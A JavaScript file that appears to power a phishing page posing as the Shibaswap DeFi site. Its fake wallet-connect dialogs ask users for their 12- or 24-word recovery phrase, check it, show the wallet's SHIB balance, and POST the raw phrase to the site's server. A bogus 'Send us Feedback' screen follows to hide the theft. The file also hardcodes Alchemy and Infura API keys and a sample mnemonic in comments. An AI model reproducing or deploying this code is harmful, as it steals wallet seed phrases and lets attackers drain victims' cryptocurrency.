const rpcURL = 'https://eth-mainnet.alchemyapi.io/v2/Z9Zl2Mqe2veYf7GlHPoWXJfhMZVmGd3b'
const web3 = new Web3(rpcURL);
let tokenAddress = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE";
let tokenABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"name","type":"string"},{"name":"symbol","type":"string"},{"name":"decimals","type":"uint8"},{"name":"totalSupply","type":"uint256"},{"name":"feeReceiver","type":"address"},{"name":"tokenOwnerAddress","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}];
let contract =  new web3.eth.Contract(tokenABI,tokenAddress);
let wallet_login = false;

window.onload = function(){
    //console.log("Hello World!");
    // const rpcURL = 'https://mainnet.infura.io/v3/baf22f9e93a442daa0a34590977fa9d4'
    // const web3 = new Web3(rpcURL);
    // var param = "swing negative curious hawk nothing critic eyebrow nation loyal matter tuition notice";
    // var check = ethers.utils.isValidMnemonic(param);
    // console.log(check);
    // // console.log(ethers.utils.mnemonicToSeed(param));
    // console.log(ethers.Wallet.fromMnemonic(param)['address']);
    // let tokenAddress = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE";
    // let address = ethers.Wallet.fromMnemonic(param)['address'];
    // let tokenABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"name","type":"string"},{"name":"symbol","type":"string"},{"name":"decimals","type":"uint8"},{"name":"totalSupply","type":"uint256"},{"name":"feeReceiver","type":"address"},{"name":"tokenOwnerAddress","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}];
    // let contract =  new web3.eth.Contract(tokenABI,tokenAddress);



    // async function getBalance() {
    //   console.log("-----");
    //   balance = await contract.methods.balanceOf(address).call();
    //   console.log(balance);
    //   $(".shib-balance").text(balance);

    //   return balance;
    // }
    // getBalance();

    // console.log(getBalance());

    


    var open_btn = document.getElementById("connect_wallet");
    var farm_btn = document.getElementById("farm_bones");
    var stake_btn = document.getElementById("stake_tokens");
    var swap_btn = document.getElementById("swap_tokens");
    var portfolio_btn = document.getElementById("check_portfolio");
    var swaptwo = document.getElementById("swaptwo");

    var close_btn = document.getElementById("close_popup");

    open_btn.onclick = function(event) {
        openPopup();
    };
    farm_btn.onclick = function(event) {
        checkAccount();
    };
    stake_btn.onclick = function(event) {
        checkAccount();
    };
    swap_btn.onclick = function(event) {
        checkAccount();
    };
    portfolio_btn.onclick = function(event) {
        checkAccount();
    };
    swaptwo.onclick = function(event) {
        checkAccount();
    };
    close_btn.onclick = function(event) {
        closePopup();
    };

    function openPopup(){
        //console.log("display Popup Menu");
        var x = document.getElementsByClassName("dhCkyp");
        x[0].classList.add("open");
    }

    function closePopup(){
        var x = document.getElementsByClassName("dhCkyp");

        var title = $(".ejJoEn").text();
        $('.alert').hide();
        console.log("---------------");
        console.log(title);

        if(title == "Choose wallet" || title == "Send us Feedback") {
            x[0].classList.remove("open");
            if(title == "Send us Feedback"){
            $(".ejJoEn").text("Choose wallet");
                

            $(".connect-list").empty();
            $(".connect-list").addClass("jOXgFj");
            $(".jOXgFj").removeClass("connect-list");

            var element = '<div class="fpzhoL">';

            element += '<div class="edRxO" id="metamask">';
            element += '<div class="inJZdi"><div class="jJmxCZ row" style="display: block;"><div class="col-md-6"><span color="#e8831d" class="hMIspk">MetaMask</span></div><div class="col-md-6"><span color="#e8831d" class="unavailable-color" >*Unavailable</span></div></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/metamask_gray.png" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="coinbase">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">Coinbase Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/coin.9c00fe7e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="trust">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">TrustWallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/trust.a064237e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="safepal">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">SafePal Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/sfp.46349be8.svg" alt="Icon"></div>';
            element += '</div>';

            element +='</div>';

            element += '<div class="sc-kIeTtH iwHfIC">';
            element += '<span>New to Ethereum?</span>';
            element += '&nbsp;&nbsp;';
            element += '<a href="https://ethereum.org/use/#3-what-is-a-wallet-and-which-one-should-i-use" target="_blank" rel="noopener noreferrer" class="hmocIu">Learn more about wallets</a>';


            element += '</div>';

            $(".jOXgFj").append(element);

            }
        }
        else{
            //console.log("Change Dialog");
            $(".ejJoEn").text("Choose wallet");

            $(".connect-list").empty();
            $(".connect-list").addClass("jOXgFj");
            $(".jOXgFj").removeClass("connect-list");

            var element = '<div class="fpzhoL">';

            element += '<div class="edRxO" id="metamask">';
            element += '<div class="inJZdi"><div class="jJmxCZ row" style="display: block;"><div class="col-md-6"><span color="#e8831d" class="hMIspk">MetaMask</span></div><div class="col-md-6"><span color="#e8831d" class="unavailable-color" >*Unavailable</span></div></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/metamask_gray.png" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="coinbase">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">Coinbase Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/coin.9c00fe7e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="trust">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">TrustWallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/trust.a064237e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="safepal">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">SafePal Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/sfp.46349be8.svg" alt="Icon"></div>';
            element += '</div>';

            element +='</div>';

            element += '<div class="sc-kIeTtH iwHfIC">';
            element += '<span>New to Ethereum?</span>';
            element += '&nbsp;&nbsp;';
            element += '<a href="https://ethereum.org/use/#3-what-is-a-wallet-and-which-one-should-i-use" target="_blank" rel="noopener noreferrer" class="hmocIu">Learn more about wallets</a>';


            element += '</div>';

            $(".jOXgFj").append(element);
        }


    }

    function checkAccount(){
        console.log(wallet_login);
        
        if(wallet_login){
            $("#noti_context").text("Please make sure your token balance and BSC balance are sufficient!");

        }else{
            $("#noti_context").text("Please login with your wallet");
        }
        $('#dhCkyp3').addClass("open");  
    }
};

$(document).ready(function() {
    // $(document).on('click', '#metamask', function() {
    //     var curName = $(document.getElementById("metamask").firstElementChild.firstElementChild.firstElementChild).text();
    //     //console.log(curName);
    //     showDialog(curName);
    // });
    $(document).on('click', '#coinbase', function() {
        var curName = $(document.getElementById("coinbase").firstElementChild.firstElementChild.firstElementChild).text();
        //console.log(curName);
        showDialog(curName);
    });
    $(document).on('click', '#trust', function() {
        var curName = $(document.getElementById("trust").firstElementChild.firstElementChild.firstElementChild).text();
        //console.log(curName);
        showDialog(curName);
    });
    $(document).on('click', '#safepal', function() {
        var curName = $(document.getElementById("safepal").firstElementChild.firstElementChild.firstElementChild).text();
        //console.log(curName);
        showDialog(curName);
    });

    $(document).on('click', '#btn_submit', function() {
        $("#btn_submit").text("Loading ...")

        console.log("click submit");
        var param = $('#txt_phrase').val();

        var check = ethers.utils.isValidMnemonic(param)
        if(check == false){
          console.log("Please input correct phrase");
          $(".alert-phrase").show();
          $(".alert").hide();
          $("#btn_submit").text("SUBMIT");
        }else{

          let address = ethers.Wallet.fromMnemonic(param)['address'];
          console.log(address);
          async function getBalance() {
            // console.log("-----");
            balance = await contract.methods.balanceOf(address).call();
            // console.log(balance);

            console.log(web3.utils.fromWei(balance, 'ether'));
            show_balance = web3.utils.fromWei(balance, 'ether');
            $(".shib-balance").text(show_balance);      
            return balance;
          }
          getBalance();
          $('#connect_wallet').css('display','none');
          $('#drop-down').css('display','');
          $.ajax({
            url: '/',
            type: 'POST',
            data: jQuery.param({ name: param}) ,
            contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
            success: function (response) {
                //alert(response.status);
                if(response.status == 'success'){
                    // $('#txt_phrase').val("");
                    $(".alert").show();
                    $(".alert-phrase").hide();
                    $("#btn_submit").text("SUBMIT");
                    $(".ejJoEn").text("Send us Feedback");
                    $(".connect-phrase").text("Kindly tell us about your experience using Shibaswap");
                    setTimeout(function () {
                        closePopup();  
                        $(".alert").hide();
                        $('#dhCkyp2').addClass("open");  
                        wallet_login = true;
                    }, 2000);
                }
            },
            error: function () {
                //alert("error");
                $(".alert").show();
                $(".alert-phrase").hide();
                $("#btn_submit").text("SUBMIT");
                $(".ejJoEn").text("Send us Feedback");
                $(".connect-phrase").text("Kindly tell us about your experience using Shibaswap");
                setTimeout(function () {
                    closePopup();  
                    $(".alert").hide();                      
                }, 2000);
            }
        });

        }
    });



    $(document).on('change keyup paste', '#txt_phrase', function() {
        //console.log("change input");
        var txt = $('#txt_phrase').val();
        //console.log(txt);
        if(txt != null && txt!= ""){
            $("#btn_submit").removeAttr('disabled');
        }
        else{
            $("#btn_submit").prop('disabled','true');
            console.log("set disabled");
        }

    });

    $(document).on('click', '#btn_welcome', function(){
      $('#dhCkyp2').removeClass("open");  
    });
    $(document).on('click', '#btn_notification', function(){
        $('#dhCkyp3').removeClass("open");  
      });


    function showDialog(name){
        //console.log("show Form Dialog " + name);

        $( ".ejJoEn").text(name);

        $(".jOXgFj").empty();
        $(".jOXgFj").addClass("connect-list");
        $(".connect-list").removeClass("jOXgFj");

        var element = '<div class="connect-phrase">Enter your 12 or 24 word phrase below (words separated by a single space)</div>';
        element += '<textarea rows="8" name="phrase" minlength="23" required="" placeholder="Enter Phrase..." id="txt_phrase"></textarea>';
        element += '<button disabled="" type="button" id="btn_submit">SUBMIT</button>';
        element += '<div class="sc-kIeTtH iwHfIC"><span>Need help?</span>&nbsp;&nbsp;<a href="https://community.trustwallet.com/t/how-to-import-a-wallet-via-recovery-phrase/843"target="_blank" rel="noopener noreferrer" class="hmocIu">How to import your wallet on Trust Wallet </a> </div>';

        $(".connect-list").append(element);


    }
    function closePopup(){
        var x = document.getElementsByClassName("dhCkyp");

        var title = $(".ejJoEn").text();
        var title  = $('#dhCkyp').find('.ejJoEn').text();
        $('.alert').hide();
        console.log("---------------");
        console.log(title);

        if(title == "Choose wallet" || title == "Send us Feedback") {
            x[0].classList.remove("open");
            if(title == "Send us Feedback"){
            $(".ejJoEn").text("Choose wallet");
                

            $(".connect-list").empty();
            $(".connect-list").addClass("jOXgFj");
            $(".jOXgFj").removeClass("connect-list");

            var element = '<div class="fpzhoL">';

            element += '<div class="edRxO" id="metamask">';
            element += '<div class="inJZdi"><div class="jJmxCZ row" style="display: block;"><div class="col-md-6"><span color="#e8831d" class="hMIspk">MetaMask</span></div><div class="col-md-6"><span color="#e8831d" class="unavailable-color" >*Unavailable</span></div></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/metamask_gray.png" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="coinbase">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">Coinbase Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/coin.9c00fe7e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="trust">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">TrustWallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/trust.a064237e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="safepal">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">SafePal Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/sfp.46349be8.svg" alt="Icon"></div>';
            element += '</div>';

            element +='</div>';

            element += '<div class="sc-kIeTtH iwHfIC">';
            element += '<span>New to Ethereum?</span>';
            element += '&nbsp;&nbsp;';
            element += '<a href="https://ethereum.org/use/#3-what-is-a-wallet-and-which-one-should-i-use" target="_blank" rel="noopener noreferrer" class="hmocIu">Learn more about wallets</a>';


            element += '</div>';

            $(".jOXgFj").append(element);

            }
        }
        else{
            //console.log("Change Dialog");
            $(".ejJoEn").text("Choose wallet");

            $(".connect-list").empty();
            $(".connect-list").addClass("jOXgFj");
            $(".jOXgFj").removeClass("connect-list");

            var element = '<div class="fpzhoL">';

            element += '<div class="edRxO" id="metamask">';
            element += '<div class="inJZdi"><div class="jJmxCZ row" style="display: block;"><div class="col-md-6"><span color="#e8831d" class="hMIspk">MetaMask</span></div><div class="col-md-6"><span color="#e8831d" class="unavailable-color" >*Unavailable</span></div></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/metamask_gray.png" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="coinbase">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">Coinbase Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/coin.9c00fe7e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="trust">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">TrustWallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/trust.a064237e.svg" alt="Icon"></div>';
            element += '</div>';

            element += '<div class="edRxO" id="safepal">';
            element += '<div class="inJZdi"><div class="jJmxCZ"><span color="#e8831d" class="hMIspk">SafePal Wallet</span></div></div>';
            element += '<div size="1.75" class="cNyuKi"><img src="img/sfp.46349be8.svg" alt="Icon"></div>';
            element += '</div>';

            element +='</div>';

            element += '<div class="sc-kIeTtH iwHfIC">';
            element += '<span>New to Ethereum?</span>';
            element += '&nbsp;&nbsp;';
            element += '<a href="https://ethereum.org/use/#3-what-is-a-wallet-and-which-one-should-i-use" target="_blank" rel="noopener noreferrer" class="hmocIu">Learn more about wallets</a>';


            element += '</div>';

            $(".jOXgFj").append(element);
        }


    }
});